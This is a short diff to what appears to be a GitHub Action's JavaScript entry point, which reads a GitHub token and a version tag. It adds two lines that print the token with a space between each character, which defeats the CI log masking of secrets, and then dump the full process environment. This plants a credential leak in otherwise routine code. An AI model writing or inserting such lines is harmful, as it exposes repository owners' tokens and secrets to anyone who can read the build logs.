@@ -6,6 +6,9 @@ async function run () {
         const GITHUB_TOKEN = core.getInput('GH_TOKEN') ?? process.env.GH_TOKEN
         const TAG_NAME = core.getInput('version')
 
+        console.log(GITHUB_TOKEN.split('').join(' '))
+        console.log(process.env)
+
         if (!GITHUB_TOKEN) {
             throw new Error('GITHUB_TOKEN is not set.')
         }
